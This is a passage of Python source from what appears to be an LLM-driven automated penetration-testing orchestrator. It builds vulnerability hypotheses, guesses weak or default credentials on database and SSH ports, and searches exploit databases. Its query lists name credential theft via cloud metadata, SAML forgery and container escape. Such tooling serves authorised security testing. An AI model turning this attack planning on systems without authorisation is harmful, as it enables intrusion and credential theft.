                    log.info("_analyze_phase: stored %d attack paths in DKG",
                             len([ap for ap in attack_paths if isinstance(ap, dict)]))
            else:
                vulns_json = parsed if isinstance(parsed, list) else []
            print(f"[ANALYZE] Parsed {len(vulns_json)} vulnerability hypotheses from LLM")

            # Collect all known params from typed PipelineState
            all_known_params: set[str] = set()
            for ep in state.endpoints:
                for p in ep.params:
                    all_known_params.add(p)

            for v in vulns_json:
                vt = v.get("vuln_type", "")
                # Correct guessed parameter names against known params
                llm_param = v.get("param", "")
                if llm_param and all_known_params and llm_param not in all_known_params:
                    ep_url = v.get("endpoint", "")
                    ep_params = state.get_params_for_url(ep_url)
                    if ep_params:
                        log.warning(
                            "ANALYZE: LLM guessed param '%s' but DKG has %s for %s — correcting",
                            llm_param, ep_params, ep_url,
                        )
                        v["param"] = ep_params[0]
                    else:
                        log.warning(
                            "ANALYZE: LLM guessed param '%s' but no DKG params found for %s",
                            llm_param, ep_url,
                        )

                vt = v.get("vuln_type", "")
                hypothesis = VulnerabilityHypothesis(
                    vuln_type=vt,
                    endpoint=v.get("endpoint", ""),
                    param=v.get("param", ""),
                    confidence=float(v.get("confidence", 0.5)),
                    evidence=v.get("evidence", ""),
                    suggested_tool=v.get("suggested_tool", ""),
                    tool_args=v.get("tool_args", {}) if isinstance(v.get("tool_args"), dict) else {},
                )
                self.vulnerabilities.append(hypothesis)

                # Record in DKG with LLM-suggested tool if provided
                dkg_props: dict = {
                    "vuln_type": vt,
                    "endpoint": hypothesis.endpoint,
                    "parameter": hypothesis.param,
                    "severity": "unknown",
                    "source": "llm_analysis",
                }
                suggested_tool = v.get("suggested_tool", "")
                if suggested_tool:
                    # Validate tool name against actual registry
                    all_valid_tools = (self.attack_gateway.get_tool_names()
                                       + self.recon_gateway.get_tool_names())
                    if suggested_tool not in all_valid_tools:
                        # Fuzzy match: find closest real tool name
                        from difflib import get_close_matches
                        matches = get_close_matches(suggested_tool, all_valid_tools, n=1, cutoff=0.3)
                        if matches:
                            log.info("Analyze: corrected tool '%s' → '%s'", suggested_tool, matches[0])
                            suggested_tool = matches[0]
                        else:
                            log.warning("Analyze: unknown tool '%s' — dropping suggestion", suggested_tool)
                            suggested_tool = ""
                    dkg_props["suggested_tool"] = suggested_tool
                    tool_args = v.get("tool_args", {})
                    # Normalize: CLI-style string args → dict if possible
                    if isinstance(tool_args, str):
                        log.info("Analyze: tool_args was string '%s' — converting to dict with 'url'", tool_args[:80])
                        tool_args = {"url": tool_args}
                    if isinstance(tool_args, dict):
                        dkg_props["tool_args"] = tool_args
                self.dkg.add_node("Vulnerability", f"vuln-{len(self.vulnerabilities)}", dkg_props)
        except Exception as e:
            log.warning("_analyze_phase: failed to parse LLM vulnerability output: %s", e)

        # Fallback: if LLM produced no hypotheses, build from DKG findings
        if not self.vulnerabilities:
            self._augment_from_dkg()
        else:
            # Always augment LLM results with DKG-derived hypotheses
            before = len(self.vulnerabilities)
            self._augment_from_dkg()
            if len(self.vulnerabilities) > before:
                log.info("_analyze_phase: augmented %d LLM hypotheses with %d from DKG",
                         before, len(self.vulnerabilities) - before)

        # ── Vulnerability summary ────────────────────────────────────
        if self.vulnerabilities:
            print(f"\n[ANALYZE] {len(self.vulnerabilities)} vulnerability hypotheses:")
            _MAX_SHOW = 15
            for i, v in enumerate(self.vulnerabilities[:_MAX_SHOW], 1):
                vt_padded = f"[{v.vuln_type:<12}]"
                ep_short = v.endpoint[:55] if v.endpoint else "?"
                param_str = f"param={v.param}" if v.param else "param=(none)"
                print(f"  {i:2d}. {vt_padded} {ep_short:<56} {param_str:<20} conf={v.confidence:.0%}")
                if v.evidence:
                    print(f"      Evidence: {v.evidence[:130]}")
                if v.suggested_tool and v.suggested_tool != "curl_get":
                    print(f"      Tool: {v.suggested_tool}")
            if len(self.vulnerabilities) > _MAX_SHOW:
                print(f"  ... and {len(self.vulnerabilities) - _MAX_SHOW} more")
        else:
            print("[ANALYZE] No vulnerability hypotheses generated.")

        self.step_count += 1

    def _augment_from_dkg(self) -> None:
        """Add vulnerability hypotheses derived from DKG endpoints and findings.

        Uses LLM to classify nikto findings into actionable vuln types.
        Writes derived hypotheses to BOTH self.vulnerabilities AND DKG.
        """
        # Collect nikto findings for LLM classification
        nikto_findings = []
        for v in self.dkg.query_nodes("Vulnerability"):
            detail = v.get("detail", "")
            endpoint = v.get("endpoint", "")
            if detail and endpoint and v.get("source") == "nikto":
                nikto_findings.append({"detail": detail, "endpoint": endpoint})

        if nikto_findings:
            # Ask LLM to classify all nikto findings in one batch
            findings_text = "\n".join(
                f"{i+1}. [{f['endpoint']}] {f['detail']}"
                for i, f in enumerate(nikto_findings[:15])
            )
            try:
                self._maybe_compress()
                llm_content, _ = self.llm.generate(
                    prompt=f"Classify each nikto finding into a vulnerability type. "
                           f"Allowed types: SQLI, XSS, CMDI, SSTI, LFI, IDOR, CSRF, AUTH. "
                           f"For each, also specify a suggested_tool (sqlmap_test, "
                           f"xss_reflection_test, command_injection_test, or curl_get) "
                           f"and confidence (0.0-1.0).\n\n"
                           f"Nikto findings:\n{findings_text}\n\n"
                           f"Output JSON array: [{{\"index\": 1, \"vuln_type\": \"...\", "
                           f"\"suggested_tool\": \"...\", \"confidence\": 0.X}}]",
                    system_prompt="You are a vulnerability classifier. Output only valid JSON.",
                )
                classifications = self._extract_json(llm_content)
                if isinstance(classifications, list):
                    class_map = {}
                    for c in classifications:
                        if isinstance(c, dict):
                            idx = c.get("index", 0)
                            class_map[idx - 1] = c  # 1-based → 0-based

                    for i, nf in enumerate(nikto_findings):
                        cls = class_map.get(i, {})
                        vtype = cls.get("vuln_type", "") or "XSS"
                        suggested_tool = cls.get("suggested_tool", "")
                        confidence = float(cls.get("confidence", 0.3))
                        endpoint = nf["endpoint"]
                        if not any(vv.endpoint == endpoint and vv.vuln_type == vtype
                                   for vv in self.vulnerabilities):
                            self.vulnerabilities.append(VulnerabilityHypothesis(
                                vuln_type=vtype, endpoint=endpoint, param="",
                                confidence=confidence, evidence=nf["detail"],
                                suggested_tool=suggested_tool,
                            ))
                            props: dict = {
                                "vuln_type": vtype, "endpoint": endpoint,
                                "parameter": "", "severity": "low",
                                "source": "llm_classified", "detail": nf["detail"],
                            }
                            if suggested_tool:
                                props["suggested_tool"] = suggested_tool
                            self.dkg.add_node("Vulnerability",
                                              f"vuln-{len(self.vulnerabilities)}", props)
                    return  # LLM classified successfully, skip fallback
            except Exception as e:
                log.warning("LLM nikto classification failed: %s — using keyword fallback", e)

        # Fallback: keyword-based classification (if LLM unavailable)
        for v in self.dkg.query_nodes("Vulnerability"):
            detail = v.get("detail", "")
            vtype = "XSS"
            for kw, vt in [("sql", "SQLI"), ("injection", "SQLI"), ("xss", "XSS"),
                           ("cross-site", "XSS"), ("command injection", "CMDI"), ("rce", "CMDI"),
                           ("directory listing", "LFI"), ("path traversal", "LFI"),
                           ("idor", "IDOR"), ("broken auth", "AUTH"), ("csrf", "CSRF")]:
                if kw in detail.lower():
                    vtype = vt; break
            endpoint = v.get("endpoint", "")
            if not any(vv.endpoint == endpoint and vv.vuln_type == vtype for vv in self.vulnerabilities):
                self.vulnerabilities.append(VulnerabilityHypothesis(
                    vuln_type=vtype, endpoint=endpoint, param="",
                    confidence=0.3, evidence=detail,
                ))
                self.dkg.add_node("Vulnerability", f"vuln-{len(self.vulnerabilities)}", {
                    "vuln_type": vtype, "endpoint": endpoint,
                    "parameter": "", "severity": "low",
                    "source": "nikto_keyword", "detail": detail,
                })
        # Every endpoint → at least one injection hypothesis
        # Any endpoint could be vulnerable to multiple injection types.
        # The exploit phase will quickly rule out false positives.
        common_params = ["q", "id", "search", "query", "user", "input", "name", "file", "page"]
        endpoints_with_params = False
        for ep in self.dkg.query_nodes("Endpoint"):
            url, params = ep.get("url", ""), ep.get("params", "")
            method = ep.get("method", "GET")
            if not url:
                continue
            if params:
                if any(v.endpoint == url and v.param == params for v in self.vulnerabilities):
                    continue
                for vt in ("SQLI", "XSS", "CMDI"):
                    self.vulnerabilities.append(VulnerabilityHypothesis(
                        vuln_type=vt, endpoint=url, param=params,
                        confidence=0.30, evidence=f"{method} parameter: {params}",
                    ))
                    self.dkg.add_node("Vulnerability", f"vuln-{len(self.vulnerabilities)}", {
                        "vuln_type": vt, "endpoint": url, "parameter": params,
                        "severity": "medium", "source": "param_heuristic",
                    })
            elif method == "POST":
                # POST endpoint — collect params from ALL endpoint nodes (HTML extraction
                # stores params on the page URL, not the endpoint URL)
                all_ep = self.dkg.query_nodes("Endpoint")
                post_params = [e.get("params", "") for e in all_ep
                              if e.get("params", "") and e.get("params", "") not in ("", "*")]
                best_param = post_params[0] if post_params else "job_type"
                # Combine with common guesses for robustness
                all_params = list(dict.fromkeys(
                    [best_param] + post_params + ["job_type", "type", "name", "id", "query"]))
                for p in all_params[:3]:
                    if not any(v.endpoint == url and getattr(v, 'param', '') == p
                              for v in self.vulnerabilities):
                        for vt in ("SQLI", "XSS", "CMDI"):
                            tool = "sqlmap_test" if vt == "SQLI" else (
                                "xss_reflection_test" if vt == "XSS" else "command_injection_test")
                            self.vulnerabilities.append(VulnerabilityHypothesis(
                                vuln_type=vt, endpoint=url, param=p,
                                confidence=0.30,
                                evidence=f"POST endpoint — injection test (param={p})",
                                suggested_tool=tool,
                                tool_args={"url": url, "param": p, "method": "POST", "body_format": "json"},
                            ))
                            self.dkg.add_node("Vulnerability", f"vuln-{len(self.vulnerabilities)}", {
                                "vuln_type": vt, "endpoint": url, "parameter": p,
                                "severity": "medium", "source": "post_endpoint_heuristic",
                                "suggested_tool": tool,
                                "tool_args": {"url": url, "param": p,
                                              "method": "POST", "body_format": "json"},
                            })
        # Endpoints with numeric path segments → IDOR + SQLI
        for ep in self.dkg.query_nodes("Endpoint"):
            url = ep.get("url", "")
            if not url or not url.startswith("http") or any(v.endpoint == url for v in self.vulnerabilities):
                continue
            if re.search(r'/\d+', url):
                self.vulnerabilities.append(VulnerabilityHypothesis(
                    vuln_type="IDOR", endpoint=url, param="id",
                    confidence=0.3, evidence="Numeric ID in URL path",
                ))
                self.vulnerabilities.append(VulnerabilityHypothesis(
                    vuln_type="SQLI", endpoint=url, param="id",
                    confidence=0.25, evidence="Numeric ID in URL path",
                ))
                self.dkg.add_node("Vulnerability", f"vuln-{len(self.vulnerabilities)-1}", {
                    "vuln_type": "IDOR", "endpoint": url, "parameter": "id",
                    "severity": "medium", "source": "path_heuristic",
                })
                self.dkg.add_node("Vulnerability", f"vuln-{len(self.vulnerabilities)}", {
                    "vuln_type": "SQLI", "endpoint": url, "parameter": "id",
                    "severity": "medium", "source": "path_heuristic",
                })

        # Safety net: if too few vulns from LLM, supplement with heuristic hypotheses
        if len(self.vulnerabilities) < 5:
            for ep in self.dkg.query_nodes("Endpoint"):
                url = ep.get("url", "")
                if not url or not url.startswith("http"):
                    continue
                if any(v.endpoint == url for v in self.vulnerabilities):
                    continue  # already has a hypothesis
                resp = ep.get("sample_response", "")
                params = ep.get("params", "")
                method = ep.get("method", "GET")
                resp_len = ep.get("response_size", 0)
                # Pick the single most likely vuln type based on response characteristics
                if params:
                    vt, param = "SQLI", params.split(",")[0] if params else "id"
                elif method == "POST":
                    vt, param = "CMDI", "cmd"
                elif resp_len > 100000:
                    vt, param = "XSS", "q"  # large SPA → XSS
                elif "json" in resp.lower() or resp.strip().startswith("{"):
                    vt, param = "IDOR", "id"  # API response → IDOR
                else:
                    vt, param = "XSS", "q"
                self.vulnerabilities.append(VulnerabilityHypothesis(
                    vuln_type=vt, endpoint=url, param=param,
                    confidence=0.30,
                    evidence=f"Heuristic — {method} endpoint, {resp_len}b response, params={params or 'none'}",
                ))
                tool = self._guess_tool(vt)
                self.dkg.add_node("Vulnerability", f"vuln-{len(self.vulnerabilities)}", {
                    "vuln_type": vt, "endpoint": url, "parameter": param,
                    "severity": "low", "source": "generic_fallback",
                    "suggested_tool": tool,
                })

        # ── Non-HTTP service vulnerability detection ─────────────────
        _NON_HTTP_VULN_MAP = {
            6379: ("AuthBypass", "Redis may be accessible without authentication",
                   "redis_cmd", "redis"),
            27017: ("AuthBypass", "MongoDB may be accessible without authentication",
                    "shell_exec", "mongodb"),
            11211: ("AuthBypass", "Memcached may be accessible without authentication",
                    "shell_exec", "memcached"),
            3306: ("WeakAuth", "MySQL may use weak/default credentials",
                   "mysql_query", "mysql"),
            5432: ("WeakAuth", "PostgreSQL may use weak/default credentials",
                   "psql_query", "postgresql"),
            1433: ("WeakAuth", "MSSQL may use weak/default credentials",
                   "mssql_query", "mssql"),
            1521: ("WeakAuth", "Oracle may use weak/default credentials",
                   "oracle_query", "oracle"),
            22: ("WeakAuth", "SSH may be accessible with weak credentials or key-based auth",
                 "ssh_exec", "ssh"),
        }
        # Service name → vuln mapping (for non-standard ports)
        _SVC_NAME_MAP = {
            "redis": (6379,), "mysql": (3306,), "postgresql": (5432,),
            "mssql": (1433,), "oracle": (1521,), "mongodb": (27017,),
            "memcached": (11211,), "ssh": (22,), "openssh": (22,),
        }
        for svc in self.dkg.query_nodes("Service"):
            port = svc.get("port")
            # Match by port first, then by service name for non-standard ports
            target_port = None
            if port in _NON_HTTP_VULN_MAP:
                target_port = port
            else:
                version = (svc.get("version", "") or svc.get("banner", "")).lower()
                for name, ports in _SVC_NAME_MAP.items():
                    if name in version:
                        target_port = ports[0]
                        break
            if target_port is None:
                continue
            if svc.get("skip_exploit") and target_port != 22:
                continue
            vt, evidence, tool, proto = _NON_HTTP_VULN_MAP[target_port]
            host = svc.get("ip", self.target_host)
            endpoint = f"{proto}://{host}:{port}"
            if not any(v.endpoint == endpoint for v in self.vulnerabilities):
                self.vulnerabilities.append(VulnerabilityHypothesis(
                    vuln_type=vt, endpoint=endpoint, param="",
                    confidence=0.70, evidence=evidence,
                    suggested_tool=tool,
                    tool_args={"host": host, "port": port},
                ))
                self.dkg.add_node("Vulnerability", f"vuln-svc-{host}-{port}", {
                    "vuln_type": vt, "endpoint": endpoint, "parameter": "",
                    "severity": "high" if vt == "AuthBypass" else "medium",
                    "source": "non_http_service_heuristic",
                    "suggested_tool": tool,
                })

        # ── Post-filter: remove web-only vuln types from non-HTTP services ─
        _WEB_ONLY_TYPES = {"XSS", "SQLI", "IDOR", "CSRF", "SSTI", "LFI", "RFI", "SSRF", "XXE"}
        _NON_HTTP_PROTOS = {"redis", "mysql", "postgresql", "mssql", "oracle",
                            "ssh", "mongodb", "memcached", "ldap", "smb"}
        _dropped = []
        _kept = []
        for v in self.vulnerabilities:
            if (v.vuln_type in _WEB_ONLY_TYPES
                    and any(v.endpoint.startswith(f"{p}://") for p in _NON_HTTP_PROTOS)):
                _dropped.append(v)
            else:
                _kept.append(v)
        self.vulnerabilities = _kept
        # Also remove from DKG (systematic pass reads DKG directly)
        for v in _dropped:
            for n in self.dkg.query_nodes("Vulnerability"):
                if n.get("endpoint") == v.endpoint and n.get("vuln_type") in _WEB_ONLY_TYPES:
                    nid = n.get("id", "")
                    if nid:
                        self.dkg.graph.remove_node(nid)

    # ── Phase 1.55: Cloud Platform Discovery ────────────────────────

    async def _cloud_discovery_hint(self) -> None:
        """Add a PlatformDiscovery vulnerability when cloud signatures found.

        Checks DKG Endpoint sample responses for platform-specific
        patterns (response headers, API structures).  If a cloud
        platform is detected, adds a hint so the analyze LLM knows
        to explore additional services on the same endpoint.

        General — works for any cloud platform, not just AWS.
        """
        # Platform signatures: header/substring → platform name + hint
        _SIGNATURES: list[tuple[str, str, str]] = [
            # (header/pattern to search for, platform name, exploration hint)
            ("x-amz-request-id", "AWS-compatible",
             "This endpoint returns AWS S3/API-Gateway headers. "
             "Explore what OTHER AWS services (IAM, STS, Lambda, KMS, "
             "DynamoDB, SQS) are available on the same endpoint — "
             "many AWS-compatible platforms run multiple services."),
            ("x-amz-id-2", "AWS S3-compatible",
             "AWS S3 signature header detected. The endpoint may also "
             "support other AWS services — probe IAM, STS, and KMS."),
            ('"kind"', "Kubernetes API",
             "K8s API detected. Explore all API groups: /api/v1/pods, "
             "/apis/rbac.authorization.k8s.io/, /apis/apps/v1/, etc."),
            ('"apiVersion"', "Kubernetes API",
             "K8s API detected. Enumerate available resources and RBAC."),
        ]

        endpoints = self.dkg.query_nodes("Endpoint")
        if not endpoints:
            return

        for pattern, platform, hint in _SIGNATURES:
            for ep in endpoints:
                resp = (ep.get("sample_response", "") or "")[:3000]
                if pattern.lower() in resp.lower():
                    # Found cloud signature — add a discovery hint to DKG
                    ep_url = ep.get("url", "")
                    # Derive the base URL (strip path)
                    from urllib.parse import urlparse as _up4
                    _p = _up4(ep_url) if "://" in ep_url else None
                    _base = f"{_p.scheme}://{_p.hostname}:{_p.port}" if _p and _p.port else ep_url.split("/")[0] + "//" + ep_url.split("/")[2] if "://" in ep_url else ep_url

                    self.dkg.add_node(
                        "Vulnerability",
                        f"vuln-platform-{platform.lower().replace(' ','-')}",
                        {
                            "vuln_type": "PlatformDiscovery",
                            "endpoint": _base,
                            "param": "",
                            "confidence": 0.7,
                            "evidence": f"Response contains '{pattern}' — "
                                        f"suggests {platform} platform. {hint}",
                            "suggested_tool": "",
                            "tool_args": {},
                            "source": "bootstrap-cloud-discovery",
                        },
                    )
                    # One match per platform is enough
                    break

    # ── Phase 1.8: Service Research (before analyze) ────────────────

    async def _service_research(self) -> None:
        """Hardcoded service-port vulnerability lookup. Runs BEFORE analyze.

        For each discovered service with a meaningful version, search local RAG
        and MCP/NVD for known CVEs. Results are injected into the LLM context
        so that _analyze_phase() can generate precise, evidence-based hypotheses.
        Skips services marked skip_exploit (SSH, etc.).
        """
        services = self.dkg.query_nodes("Service")
        if not services:
            return

        log.info("_service_research: searching %d services for known CVEs", len(services))
        service_research_text = ""
        try:
            for s in services[:10]:
                port = s.get("port", 0)
                version = s.get("version", "") or s.get("banner", "")
                if s.get("skip_exploit"):
                    continue
                if not version or version in ("unknown", "tcpwrapped", "http", "https", ""):
                    continue
                # MCP NVD CVE search
                try:
                    if "nvd_search_cves" in self.mcp_pool.get_tool_names():
                        mcp_result = await self.mcp_pool.call_tool(
                            "nvd_search_cves",
                            {"keyword": version, "limit": 3},
                        )
                        content = mcp_result.get("content", [{}])
                        text = content[0].get("text", "") if content else ""
                        if text and "0 matching CVEs" not in text:
                            service_research_text += f"  [NVD CVEs] {text[:400]}\n"
                except Exception:
                    pass

                # RAG knowledge_search for non-HTTP database services
                _NON_HTTP_RAG_PORTS = {22, 6379, 3306, 5432, 1433, 1521, 27017, 11211, 9200, 8086, 5984, 9042, 9092, 4444}
                if port in _NON_HTTP_RAG_PORTS:
                    try:
                        svc_name = version or f"port {port}"
                        rag_result = await self.attack_gateway.call(
                            "knowledge_search",
                            {"query": f"{svc_name} exploitation unauthorized access weak credentials",
                             "category": ""},
                        )
                        if rag_result and getattr(rag_result, 'success', False):
                            rag_text = (rag_result.stdout or rag_result.stderr or "")[:800]
                            if rag_text and "no results" not in rag_text.lower():
                                service_research_text += (
                                    f"\n  [RAG Knowledge for {svc_name}]: {rag_text}\n"
                                )
                    except Exception:
                        pass

            if service_research_text:
                self.llm.add_context_message(
                    f"[SERVICE RESEARCH] Known vulnerabilities for discovered services:\n"
                    f"{service_research_text}",
                    role="user",
                )
                # Persist to DKG so data survives _analyze_phase reset
                self.dkg.add_node("Analysis", f"svc-research-{int(time.time())}", {
                    "phase": "service_research",
                    "type": "cve_findings",
                    "content": service_research_text,
                })
                log.info("_service_research: injected %d chars of CVE data",
                         len(service_research_text))
        except Exception as e:
            log.warning("_service_research failed: %s", e)

        # ── Service research summary ─────────────────────────────────
        services = self.dkg.query_nodes("Service")
        cve_notes = [a for a in self.dkg.query_nodes("Analysis")
                     if a.get("type") == "cve_findings"]
        if cve_notes:
            cve_preview = cve_notes[0].get("content", "")[:300]
            # Extract CVE IDs from content
            import re as _re
            cve_ids = _re.findall(r'CVE-\d{4}-\d{4,}', cve_preview)
            if cve_ids:
                print(f"[RESEARCH] Found CVEs: {', '.join(cve_ids[:8])}")
            else:
                print(f"[RESEARCH] CVE data injected ({len(cve_preview)} chars)")
        else:
            print(f"[RESEARCH] No known CVEs found for {len(services)} services")

    # ── Phase 2.5: Research (vulnerability research, after analyze) ──

    async def _research_phase(self) -> None:
        """LLM-driven vulnerability research phase. Runs AFTER analyze.

        Gives the LLM research-only tools to investigate each identified
        vulnerability. The LLM can query CVE databases, the knowledge base,
        and exploit databases to gather exploitation intelligence.

        Phase A (service CVE lookup) already ran before analyze — results are
        in the LLM context.
        """
        if not self.vulnerabilities:
            return

        log.info("_research_phase: LLM researching %d vulnerabilities", len(self.vulnerabilities))
        self.phase = OrchestratorPhase.ANALYZE

        # Build research prompt with only research tools
        research_tools = []
        _local_research_tool_names = {
            "knowledge_search", "cve_lookup", "metasploit_search",
            "searchsploit_search", "go_exploitdb_search", "curl_get",
            "ddg_web_search",  # Python DuckDuckGo — replaces broken MCP web-search
        }
        for gw in [self.attack_gateway]:
            for td in gw.get_tool_definitions():
                name = td.get("function", {}).get("name", "")
                if name in _local_research_tool_names:
                    research_tools.append(td)
        # Add MCP research tools (NVD CVE, GitHub code search — NOT web-search)
        try:
            _all_mcp_names: list[str] = []
            for td in self.mcp_pool.get_tool_definitions():
                name = td.get("function", {}).get("name", "")
                _all_mcp_names.append(name)
                # Only include MCP tools that are NOT web search (NVD, GitHub code, etc.)
                if any(kw in name.lower() for kw in
                       ("cve", "vuln", "nvd", "code", "repo", "issue", "commit", "pull")):
                    research_tools.append(td)
            log.info("MCP research tools: %d (from %d total MCP tools)",
                     len(research_tools), len(_all_mcp_names))
        except Exception:
            pass

        # ddg_web_search is always available via attack_gateway (Python ddgs library)
        _web_search_line = (
            f"- ddg_web_search: search the internet via DuckDuckGo for up-to-date\n"
            f"  exploitation techniques, default credentials, and service-specific\n"
            f"  attack methods. Use this TOGETHER with knowledge_search — RAG covers\n"
            f"  general techniques, web search provides current service-specific details.\n"
        )

        vuln_text = self._format_vulnerability_summary()

        # ── Build service-specific search queries ──
        # Cloud service keywords → RAG search query mapping.
        # When DARWIN identifies a cloud-native technology (CloudFormation,
        # OIDC, SAML, IAM, etc.) but _svc_name stays as "service", the RAG
        # query "service exploitation default credentials weaknesses" cannot
        # match cloud knowledge entries.  Detect cloud services from vuln
        # hypotheses and DKG nodes so the RAG query targets the right domain.
        _CLOUD_SVC_KEYWORDS: dict[str, str] = {
            "cloudformation": "AWS CloudFormation template injection exploitation",
            "oidc": "OIDC identity federation token exchange attack",
            "saml": "SAML federation Golden SAML assertion forgery",
            "sts": "AWS STS assume role privilege escalation",
            "imds": "AWS IMDS cloud metadata credential theft",
            "s3": "S3 object storage bucket enumeration exploitation",
            "iam": "AWS IAM privilege escalation role enumeration",
            "lambda": "AWS Lambda function exploitation PassRole",
            "organizations": "AWS Organizations SCP bypass enumeration",
            "scp": "AWS SCP service control policy bypass",
            "federation": "cloud identity federation token exchange attack",
            "kubernetes": "Kubernetes RBAC enumeration privilege escalation",
            "k8s": "Kubernetes container escape exploitation",
            "etcd": "etcd Kubernetes secrets enumeration",
            "docker": "Docker socket container escape exploitation",
        }
        _svc_name = "service"
        _is_cloud_svc = False
        # Phase A: Check ALL vulnerabilities for cloud keywords FIRST.
        # Cloud detection takes priority over DB detection — if any vuln
        # or DKG node contains a cloud keyword, it wins.
        for v in self.vulnerabilities:
            ep = (v.endpoint or "").lower()
            tool = (v.suggested_tool or "").lower()
            vt = (v.vuln_type or "").lower()
            ev = (v.evidence or "").lower()
            _combined = f"{vt} {ep} {ev} {tool}"
            for _kw, _label in _CLOUD_SVC_KEYWORDS.items():
                if _kw in _combined:
                    _svc_name = _label
                    _is_cloud_svc = True
                    log.info("[RAG-SVC] %s (matched keyword '%s' from vuln)", _label, _kw)
                    break
            if _is_cloud_svc:
                break
        # Phase B: Check DKG service banners for cloud fingerprints
        if not _is_cloud_svc:
            for s in self.dkg.query_nodes("Service"):
                svc_data = (s.get("service_name", "") + " " + (s.get("version", "") or "") + " " + (s.get("banner", "") or "")).lower()
                for _kw, _label in _CLOUD_SVC_KEYWORDS.items():
                    if _kw in svc_data:
                        _svc_name = _label
                        _is_cloud_svc = True
                        log.info("[RAG-SVC] %s (matched keyword '%s' from DKG service banner)", _label, _kw)
                        break
                if _is_cloud_svc:
                    break
        # Phase C: Check DKG Analysis notes for cloud hints
        if not _is_cloud_svc:
            for note in self.dkg.query_nodes("Analysis"):
                note_text = (str(note.get("summary", "")) + " " + str(note.get("findings", ""))).lower()
                for _kw, _label in _CLOUD_SVC_KEYWORDS.items():
                    if _kw in note_text:
                        _svc_name = _label
                        _is_cloud_svc = True
                        log.info("[RAG-SVC] %s (matched keyword '%s' from DKG Analysis)", _label, _kw)
                        break
                if _is_cloud_svc:
                    break
        # Phase D: If still no cloud match, fall back to DB service detection
        # from the first vulnerability's tool/endpoint hints
        if not _is_cloud_svc:
            for v in self.vulnerabilities:
                ep = (v.endpoint or "").lower()
                tool = (v.suggested_tool or "").lower()
                # Try suggested_tool first (most reliable signal)
                if "mssql" in tool or "mssql" in ep:
                    _svc_name = "Microsoft SQL Server"
                elif "mysql" in tool or "mysql" in ep:
                    _svc_name = "MySQL"
                elif "postgres" in tool or "psql" in tool or "postgres" in ep or "psql" in ep:
                    _svc_name = "PostgreSQL"
                elif "redis" in tool or "redis" in ep:
                    _svc_name = "Redis"
                elif "oracle" in tool or "oracle" in ep:
                    _svc_name = "Oracle"
                elif "ssh" in tool or "ssh" in ep:
                    _svc_name = "SSH"
                elif "smb" in tool or "smb" in ep:
                    _svc_name = "SMB"
                if _svc_name != "service":
                    break
            # Also check DKG services for DB matches
            if _svc_name == "service":
                for v in self.vulnerabilities:
                    for s in self.dkg.query_nodes("Service"):
                        svc_port = str(s.get("port", ""))
                        vuln_port = str(v.tool_args.get("port", "")) if v.tool_args else ""
                        svc_data = (s.get("service_name", "") + " " + (s.get("version", "") or "") + " " + (s.get("banner", "") or "")).lower()
                        if svc_port and vuln_port and svc_port == vuln_port:
                            if "mssql" in svc_data or "sql server" in svc_data:
                                _svc_name = "Microsoft SQL Server"
                            elif "mysql" in svc_data:
                                _svc_name = "MySQL"
                            elif "postgres" in svc_data:
                                _svc_name = "PostgreSQL"
                            elif "redis" in svc_data:
                                _svc_name = "Redis"
                            elif "oracle" in svc_data:
                                _svc_name = "Oracle"
                            break
                    if _svc_name != "service":
                        break

        _MCP_TIMEOUT_S = 45  # per-MCP-call cap

        # ── Round 1: Programmatic forced parallel search ──
        # Run ALL local tools + ddg_web_search in parallel. All are gateway-based
        # (no MCP dependency), fast and reliable.
        # Cloud services have descriptive _svc_name labels (e.g. "AWS CloudFormation
        # template injection exploitation").  Use them directly — appending
        # "default credentials weaknesses" hurts precision for cloud topics.
        _rag_query = _svc_name if _is_cloud_svc else f"{_svc_name} exploitation default credentials weaknesses"
        _web_query = _svc_name if _is_cloud_svc else f"{_svc_name} default credentials common passwords exploitation techniques"
        _web_alt = _svc_name if _is_cloud_svc else f"{_svc_name} alternative attack vectors privilege escalation misconfiguration"
        _queries = {
            "rag": _rag_query,
            "exploitdb": _svc_name,
            "searchsploit": _svc_name,
            "web": _web_query,
            "web_alt": _web_alt,
        }
        _tasks: dict[str, asyncio.Task] = {}

        # knowledge_search (RAG)
        try:
            _tasks["rag"] = asyncio.create_task(
                self.attack_gateway.call("knowledge_search",
                    {"query": _queries["rag"], "category": ""}))
        except Exception:
            pass

        # go_exploitdb_search — local SQLite exploit DB
        try:
            _tasks["exploitdb"] = asyncio.create_task(
                self.attack_gateway.call("go_exploitdb_search",
                    {"query": _queries["exploitdb"], "limit": 10}))
        except Exception:
            pass

        # searchsploit_search — Exploit-DB CLI
        try:
            _tasks["searchsploit"] = asyncio.create_task(
                self.attack_gateway.call("searchsploit_search",
                    {"query": _queries["searchsploit"]}))
        except Exception:
            pass

        # ddg_web_search — Python DuckDuckGo (replaces broken MCP web-search)
        try:
            _tasks["web"] = asyncio.create_task(
                self.attack_gateway.call("ddg_web_search",
                    {"query": _queries["web"], "max_results": 8}))
        except Exception:
            pass

        # Wait for all tasks (failures are non-fatal)
        _results: dict[str, str] = {}
        for _key, _task in _tasks.items():
            try:
                _raw = await _task
                if _raw and hasattr(_raw, 'stdout') and _raw.stdout:
                    _results[_key] = _raw.stdout[:2500]
                elif _raw:
                    _results[_key] = str(_raw)[:2500]
            except Exception as _e:
                log.debug("_research_phase: %s failed: %s", _key, _e)

        # Build context message with all results
        _context_parts = ["## Research Results (automatic pre-search)\n"]
        _labels = {
            "rag": "knowledge_search (RAG)",
            "exploitdb": "go_exploitdb_search (local Exploit-DB)",
            "searchsploit": "searchsploit_search (Exploit-DB CLI)",
            "web": "ddg_web_search (DuckDuckGo internet)",
        }
        for _key in ("rag", "exploitdb", "searchsploit", "web"):
            _label = _labels.get(_key, _key)
            if _key in _results:
                _context_parts.append(f"### {_label}: {_queries.get(_key, '')}\n{_results[_key]}")
            else:
                _context_parts.append(f"### {_label}\n(search unavailable)")
        _context_parts.append("")
        self.llm.add_context_message("\n".join(_context_parts), role="user")

        # ── Rounds 2-3: LLM-driven free research ──
        # Now the LLM has both RAG and web results. It can call additional tools
        # (cve_lookup, metasploit_search, more specific searches, etc.)
        _first_prompt = (
            f"You are in the RESEARCH phase. Do NOT run any exploit tools.\n\n"
            f"## Vulnerabilities to research:\n{vuln_text}\n\n"
            f"## Available research tools:\n"
            f"- knowledge_search: local knowledge base (general techniques, MITRE ATT&CK, CVEs)\n"
            f"{_web_search_line}"
            f"- cve_lookup: look up CVE details\n"
            f"- metasploit_search: search for Metasploit modules\n"
            f"- searchsploit_search: search ExploitDB for public exploits\n"
            f"- go_exploitdb_search: search local exploit database\n"
            f"- curl_get: fetch documentation or verify endpoint details\n\n"
            f"## Context\n"
